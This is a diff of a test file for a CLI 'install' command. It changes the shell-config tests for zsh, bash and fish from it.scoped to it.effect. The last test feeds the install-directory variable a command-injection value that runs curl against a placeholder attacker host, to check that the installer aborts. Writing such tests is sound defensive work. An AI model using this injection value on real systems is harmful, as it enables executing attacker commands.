@@ -2,8 +2,7 @@ import path from 'node:path';
 import process from 'node:process';
 import { beforeEach, afterEach } from 'vitest';
 import { describe, expect, layer } from '@effect/vitest';
-import { Effect } from 'effect';
-import { FileSystem } from '@effect/platform';
+import { Effect, FileSystem } from 'effect';
 import { NodeOs } from 'src/services/node-os';
 import { cli, TestLive, MockConsole } from 'test/__utils__';
 
@@ -31,7 +30,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell is zsh', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] creates .zshrc with PATH only by default', () =>
+      it.effect('[Then] creates .zshrc with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/bin/zsh';
@@ -62,7 +61,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell is bash', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] creates .bashrc with PATH only by default', () =>
+      it.effect('[Then] creates .bashrc with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/bin/bash';
@@ -85,7 +84,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell is fish', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] creates config.fish with PATH only by default', () =>
+      it.effect('[Then] creates config.fish with PATH only by default', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/usr/bin/fish';
@@ -108,7 +107,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --completions is passed', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] writes PATH block and installs completions', () =>
+      it.effect('[Then] writes PATH block and installs completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/bin/bash';
@@ -134,7 +133,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] fish shell installs completions', () => {
     layer(TestLive())(it => {
-      it.scoped(
+      it.effect(
         '[Then] keeps PATH setup in config.fish and writes completions to composio.fish',
         () =>
           Effect.gen(function* () {
@@ -175,7 +174,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] fish shell installs completions twice', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] keeps config.fish and composio.fish idempotent', () =>
+      it.effect('[Then] keeps config.fish and composio.fish idempotent', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/usr/bin/fish';
@@ -212,7 +211,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] --no-completions is passed', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] writes PATH block but skips completions', () =>
+      it.effect('[Then] writes PATH block but skips completions', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/bin/zsh';
@@ -238,7 +237,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] install is run twice (idempotency)', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] does not duplicate entries', () =>
+      it.effect('[Then] does not duplicate entries', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/bin/bash';
@@ -266,7 +265,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] .zshrc already has the marker', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] reports already configured', () =>
+      it.effect('[Then] reports already configured', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           const fs = yield* FileSystem.FileSystem;
@@ -299,7 +298,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] shell cannot be detected', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] shows manual setup instructions', () =>
+      it.effect('[Then] shows manual setup instructions', () =>
         Effect.gen(function* () {
           process.env.SHELL = '';
 
@@ -317,7 +316,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_INSTALL_DIR is not set', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] defaults to ~/.composio', () =>
+      it.effect('[Then] defaults to ~/.composio', () =>
         Effect.gen(function* () {
           const os = yield* NodeOs;
           process.env.SHELL = '/bin/zsh';
@@ -340,7 +339,7 @@ describe('CLI: composio install', () => {
 
   describe('[When] COMPOSIO_INSTALL_DIR contains shell metacharacters', () => {
     layer(TestLive())(it => {
-      it.scoped('[Then] aborts with an error', () =>
+      it.effect('[Then] aborts with an error', () =>
         Effect.gen(function* () {
           process.env.SHELL = '/bin/zsh';
           process.env.COMPOSIO_INSTALL_DIR = '/tmp/x; curl evil.com';
